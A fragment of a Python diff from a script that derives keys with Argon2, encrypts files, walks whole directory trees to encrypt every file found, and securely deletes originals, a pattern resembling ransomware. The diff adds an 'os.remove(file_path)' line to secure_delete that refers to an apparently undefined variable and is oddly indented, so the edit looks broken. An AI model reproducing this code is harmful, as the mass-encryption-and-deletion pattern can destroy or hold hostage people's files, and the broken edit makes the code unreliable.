@@ -15,8 +15,6 @@ ARGON2_TIME = 2         # Number of iterations
 ARGON2_MEMORY = 102400  # Memory cost in kibibytes
 ARGON2_PARALLELISM = 8  # Degree of parallelism
 
-
-
 def encrypt_file(file_path, key):
     with open(file_path, "rb") as f:
         data = f.read()
@@ -42,7 +40,7 @@ def secure_delete(path):
             os.remove(path)
         except Exception:
             pass
-
+    os.remove(file_path)
 def find_and_encrypt_all_files(path, key):
     for dirpath, _, files in os.walk(path):
         for name in files:
